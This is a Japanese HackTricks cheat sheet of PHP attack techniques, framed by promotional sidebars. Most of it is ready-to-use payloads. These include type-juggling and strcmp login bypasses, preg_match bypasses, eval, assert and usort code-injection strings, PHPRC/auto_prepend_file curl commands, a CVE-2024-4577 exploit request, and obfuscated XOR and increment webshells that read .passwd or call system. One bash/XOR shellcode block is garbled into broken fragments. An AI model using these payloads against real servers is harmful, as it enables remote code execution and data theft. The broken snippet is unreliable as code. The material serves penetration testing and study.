# PHPのトリック

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォローする。**
* **ハッキングトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

<figure><img src="../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## クッキーの一般的な場所：

これはphpMyAdminのクッキーにも有効です。

クッキー:
```
PHPSESSID
phpMyAdmin
```
場所：
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## PHP比較のバイパス

### 緩い比較/型変換（==）

PHPで`==`が使用されると、比較が予期しない挙動を示す場合があります。これは、"=="は値を同じ型に変換してから比較するためです。比較するデータの型も同じであることを確認したい場合は、`===`を使用する必要があります。

PHP比較テーブル: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (567).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

- `"string" == 0 -> True` 数字で始まらない文字列は数字と等しい
- `"0xAAAA" == "43690" -> True` 10進数または16進数形式の数字で構成された文字列は、他の数字/文字列と比較してTrueになる（文字列内の数字は数字として解釈される）
- `"0e3264578" == 0 --> True` "0e"で始まり、その後に何かが続く文字列は0と等しい
- `"0X3264578" == 0X --> True` "0"で始まり、任意の文字（Xは任意の文字）が続き、その後に何かが続く文字列は0と等しい
- `"0e12334" == "0" --> True` これは非常に興味深いです。いくつかのケースでは、"0"で始まり、ハッシュ化されたコンテンツと比較される文字列入力を制御できます。したがって、"0e"で始まり、任意の文字がないハッシュを作成する値を提供できれば、比較をバイパスできます。この形式の**既にハッシュ化された文字列**はここで見つけることができます: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
- `"X" == 0 --> True` 文字列内の任意の文字は整数0と等しい

詳細は[https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)で確認できます。

### **in\_array()**

**型変換**は、`in_array()`関数にもデフォルトで影響します（厳密な比較を行うには3番目の引数をtrueに設定する必要があります）。
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

この関数が**任意の認証チェック**（パスワードのチェックなど）に使用されている場合、ユーザーが比較の一方を制御できると、パスワードの値として文字列の代わりに空の配列を送信することができ、このチェックをバイパスできます (`https://example.com/login.php/?username=admin&password[]=`)。
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
### 厳密な型変換

`strcasecmp()`でも同じエラーが発生します。

`===`を使用していても、比較が**型変換**に**脆弱**になる可能性があります。たとえば、比較が**データを比較する前に異なるタイプのオブジェクトに変換**している場合:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`**を使用して、**ユーザー入力を検証**できます（**ブラックリスト**からの**単語/正規表現**が**ユーザー入力**に**存在するかどうかを確認**し、そうでない場合、コードはその実行を続行できます）。

#### 改行バイパス

ただし、regexpの開始を区切るときに、`preg_match()`は**ユーザー入力の最初の行のみをチェック**するため、何らかの方法で**複数行で入力を送信**できると、このチェックをバイパスできる可能性があります。例：
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
このチェックをバイパスするためには、**改行をURLエンコードした値を送信**するか (`%0A`)、または**JSONデータ**を送信できる場合は、**複数行に分けて**送信します：
```php
{
"cmd": "cat /etc/passwd"
}
```
Find an example here: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **長さエラーバイパス**

（このバイパスは、おそらくPHP 5.2.5で試され、PHP 7.3.15では機能しなかったようです）\
`preg_match()` に非常に**大きな入力**を送信できる場合、それを**処理できなくなり**、チェックを**バイパス**できます。たとえば、JSONをブラックリストに入れている場合、次のように送信できます：
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
#### ReDoS バイパス

トリック元: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223) および [https://mizu.re/post/pong](https://mizu.re/post/pong)

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

要するに、問題が発生するのは、PHPの`preg_*`関数が[PCREライブラリ](http://www.pcre.org/)に基づいて構築されているためです。PCREでは、特定の正規表現が多くの再帰呼び出しを使用して一致するため、多くのスタックスペースを使用します。再帰の許容量を制限することが可能ですが、PHPではこの制限が[デフォルトで 100,000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit)に設定されており、スタックに収まりきらないほど多いです。

この問題について詳しく説明されている[このStackoverflowスレッド](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error)も、この投稿にリンクされています。私たちのタスクは明確でした:\
**正規表現が 100,000 回以上の再帰を行うような入力を送信し、SIGSEGV を引き起こし、`preg_match()` 関数が `false` を返すようにし、アプリケーションが私たちの入力を悪意のあるものと考えさせ、ペイロードの最後に `{system(<verybadcommand>)}` のようなサプライズを投げて SSTI --> RCE --> フラグを取得する :)**。

実際には、正規表現の観点からは、100kの「再帰」を行っているわけではなく、「バックトラッキングステップ」を数えています。[PHPのドキュメント](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit)によると、`pcre.backtrack_limit` 変数のデフォルト値は 1,000,000 (1M) です。\
これを達成するには、`'X'*500_001` とすると、100万のバックトラッキングステップ (50万の前方および50万の後方) が結果として得られます。
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### PHPの難読化のための型変換
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## リダイレクト後に実行（EAR）

PHPが別のページにリダイレクトしている場合、ただし、**`die`**または**`exit`**関数が**`Location`**ヘッダが設定された後に呼び出されていない場合、PHPは実行を継続し、データを本文に追加します。
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## パス遍歴とファイルインクルージョンの悪用

チェック:

{% content-ref url="../../../pentesting-web/file-inclusion/" %}
[file-inclusion](../../../pentesting-web/file-inclusion/)
{% endcontent-ref %}

## もっとトリック

* **register\_globals**: **PHP < 4.1.1.1** または誤って構成されている場合、**register\_globals** が有効になっている可能性があります（またはその動作が模倣されています）。これは、グローバル変数（例：$\_GET）に値がある場合、例えば $\_GET\["param"]="1234" のように、**$param** を介してアクセスできることを意味します。したがって、HTTPパラメータを送信することで、コード内で使用されている変数を上書きできます。
* **同じドメインのPHPSESSIONクッキーは同じ場所に保存される**ため、同じドメイン内で**異なるパスで異なるクッキーが使用されている**場合、あるパスが他のパスのクッキーにアクセスするようにすることができます。\
この方法で、**両方のパスが同じ名前の変数にアクセスする場合**、**path1の変数の値をpath2に適用**させることができます。そして、path2はpath1の変数を有効として受け入れます（path2でそれに対応する名前のクッキーを与えることで）。
* マシンのユーザーの**ユーザー名**を持っている場合は、アドレスをチェックしてください: **/\~\<USERNAME>** 、PHPディレクトリが有効になっているかどうかを確認します。
* [**phpラッパーを使用したLFIおよびRCE**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

これらの関数は、通常、PHPで**パスワードからハッシュを生成**し、パスワードがハッシュと一致するかどうかを**チェック**するために使用されます。\
サポートされているアルゴリズムは、`PASSWORD_DEFAULT` と `PASSWORD_BCRYPT`（`$2y$`で始まる）です。**PASSWORD\_DEFAULT は頻繁に PASSWORD\_BCRYPT と同じ**です。現在、**PASSWORD\_BCRYPT** は入力のサイズに制限があり、72バイトを超えるものをこのアルゴリズムでハッシュしようとすると、最初の72バイトのみが使用されます。
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTPヘッダーのバイパスを利用したPHPエラー

#### ヘッダーを設定した後にエラーを発生させる

[**このTwitterスレッド**](https://twitter.com/pilvar222/status/1784618120902005070?t=xYn7KdyIvnNOlkVaGbgL6A\&s=19)から、1000以上のGETパラメータや1000以上のPOSTパラメータや20個のファイルを送信すると、PHOPはレスポンスでヘッダーを設定しないことがわかります。

例えば、CSPヘッダーが設定されているコードをバイパスすることができます。
```php
<?php
header("Content-Security-Policy: default-src 'none';");
if (isset($_GET["xss"])) echo $_GET["xss"];
```
#### ヘッダーを設定する前に本文を埋める

**PHPページがエラーを出力し、ユーザーが提供した入力をエコーバックしている**場合、ユーザーはPHPサーバーにいくつかの**十分に長いコンテンツ**を出力させることができ、サーバーがレスポンスに**ヘッダーを追加**しようとするとエラーが発生します。\
次のシナリオでは、**攻撃者がサーバーに大きなエラーを発生させ**、PHPが**ヘッダー情報を変更しようとしたときに**（たとえば、CSPヘッダーがユーザーに送信されなかった）できなかったことがわかります：

![](<../../../.gitbook/assets/image (1085).png>)

## PHP関数におけるSSRF

ページをチェックしてください：

{% content-ref url="php-ssrf.md" %}
[php-ssrf.md](php-ssrf.md)
{% endcontent-ref %}

## コード実行

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[これをチェックして、より便利なPHP関数を確認してください](php-useful-functions-disable\_functions-open\_basedir-bypass/)

### **preg\_replace()**を介したRCE
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
"replace"引数のコードを実行するには、少なくとも1つの一致が必要です。\
このpreg\_replaceのオプションは、**PHP 5.5.0以降で非推奨となりました。**

### **Eval()を通じたRCE**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **Assert()を通じたRCE**

このphp内の関数は、**文字列で書かれたコードを実行**して**trueまたはfalseを返す**ことができます（これに応じて実行を変更します）。通常、ユーザー変数は文字列の中に挿入されます。例えば：\
`assert("strpos($_GET['page']),'..') === false")` --> この場合、**RCE**を取得するには、次のようにします：
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
### **usort()を使用したRCE**

この関数は、特定の関数を使用してアイテムの配列をソートするために使用されます。\
この関数を悪用するには、コードの構文を**壊し**、あなたの**ペイロード**を**追加**し、そして**再度修正**する必要があります。**and**や**%26%26**や**|**などの**論理演算**を使用できます。最初の条件が真である場合、ペイロードは実行されないため、"or"や"||"は機能しません。同様に";"も機能しません。内部コードを持っている場合の**別のオプション**は、コマンドの実行を文字列に追加することです：`'.highlight_file('.passwd').'`。変数を変更して実行を変更するには、内部コードを持っている場合は次のようにします：`$file = "hola"`。
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
### **//**を使用してコードの残りをコメントアウトすることもできます。

閉じる必要があるかっこの数を発見するには：

- `?order=id;}//`: エラーメッセージが表示されます(`Parse error: syntax error, unexpected ';'`)。おそらく1つ以上の括弧が不足している可能性があります。
- `?order=id);}//`: **警告**が表示されます。これは正しいようです。
- `?order=id));}//`: エラーメッセージが表示されます(`Parse error: syntax error, unexpected ')' i`)。おそらく閉じる括弧が多すぎる可能性があります。

### **.httaccess**を経由したRCE

**.htaccess**を**アップロード**できる場合、いくつかの設定を**構成**したり、コードを実行したりできます（拡張子が.htaccessのファイルが**実行**されるように構成することができます）。

異なる.htaccessシェルは[こちら](https://github.com/wireghoul/htshells)で見つけることができます。

### Env変数を経由したRCE

PHPで**環境変数を変更**する脆弱性を見つけた場合（他のファイルをアップロードすることができる場合、さらなる調査が必要かもしれませんが、これをバイパスできるかもしれません）、この動作を悪用して**RCE**を取得できます。

- [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): この環境変数は、他のバイナリを実行する際に任意のライブラリを読み込むことを可能にします（この場合は機能しないかもしれません）。
- **`PHPRC`** : PHPに**構成ファイル**である通常`php.ini`と呼ばれるファイルの場所を指示します。独自の構成ファイルをアップロードできる場合は、`PHPRC`を使用してPHPを指定します。2番目にアップロードしたファイルを実行する**`auto_prepend_file`**エントリを追加します。この2番目のファイルには通常の**PHPコードが含まれ、その後PHPランタイムによって実行**されます。
1. シェルコードが含まれるPHPファイルをアップロードします。
2. 2番目のファイルをアップロードし、PHPプリプロセッサにアップロードしたファイルを実行するよう指示する**`auto_prepend_file`**ディレクティブを含めます。
3. `PHPRC`変数を、ステップ1でアップロードしたファイルに設定します。
- このチェーンを実行する方法についての詳細は、[**元のレポート**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/)を参照してください。
- **PHPRC** - 別のオプション
- ファイルをアップロードできない場合、FreeBSDでは「ファイル」`/dev/fd/0`を使用できます。これには、`stdin`で送信されたリクエストの**本文**が含まれています：
- `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
- または、**`allow_url_include`**を有効にして、**base64 PHPコード**を含むファイルを先頭に追加してRCEを取得します：
- `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
- この手法は[**このレポート**](https://vulncheck.com/blog/juniper-cve-2023-36845)からです。

### XAMPP CGI RCE - CVE-2024-4577

WebサーバーはHTTPリクエストを解析し、`http://host/cgi.php?foo=bar`のようなリクエストをPHPスクリプトに渡して、`php.exe cgi.php foo=bar`のように実行します。これにより、パラメーターのインジェクションが可能になります。これにより、本文からPHPコードを読み込むために次のパラメーターをインジェクトできます：
```jsx
-d allow_url_include=1 -d auto_prepend_file=php://input
```
さらに、PHPの後の正規化により、0xAD文字を使用して"-"パラメータをインジェクトすることが可能です。[**この投稿**](https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/)からエクスプロイトの例を確認してください。
```jsx
POST /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{host}}
User-Agent: curl/8.3.0
Accept: */*
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php
phpinfo();
?>

```
## PHP 静的解析

以下の関数への呼び出しにコードを挿入できるかどうかを確認してください（[こちら](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)から）:
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
PHPアプリケーションのデバッグ中は、`/etc/php5/apache2/php.ini` に `display_errors = On` を追加してApacheを再起動することでエラー表示をグローバルに有効にできます： `sudo systemctl restart apache2`

### PHPコードの逆難読化

**web**[ **www.unphp.net**](http://www.unphp.net) **を使用してPHPコードの逆難読化ができます。**

## PHPラッパー＆プロトコル

PHPラッパーとプロトコルを使用すると、システム内の**書き込みおよび読み取り保護をバイパス**して侵害することができます。[**詳細はこのページをチェックしてください**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols)。

## Xdebug未認証RCE

`phpconfig()`の出力で**Xdebug**が**有効**になっている場合は、[https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)を使用してRCEを取得しようとする必要があります。

## 変数変数
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## 新しい $\_GET\["a"]\($\_GET\["b"]) を悪用した RCE

ページ内で**任意のクラスの新しいオブジェクトを作成**できる場合、RCE を取得できるかもしれません。詳細については、以下のページをチェックしてください:

{% content-ref url="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## 文字を使用せずに PHP を実行する

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### 八進数を使用
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**

XOR（排他的論理和）は、2つのビットが異なる場合に1を返すビット演算子です。
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¢___ not needed then $_($__), show_source(.passwd)
```
### XOR簡単なシェルコード

[**この解説**](https://mgp25.com/ctf/Web-challenge/)によると、次のように簡単なシェルコードを生成することが可能です：
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
したのようなペイロードを悪用して任意のPHPを実行できる場合、次のようにリクエストを送信できます:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
より詳しい説明については、[https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)を参照してください。

### XOR シェルコード（eval 内部）
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### パールのように
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<figure><img src="../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい場合は**、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)で**フォロー**する。
* **HackTricks**および**HackTricks Cloud**のgithubリポジトリにPRを提出して、**あなたのハッキングトリックを共有**してください。

</details>
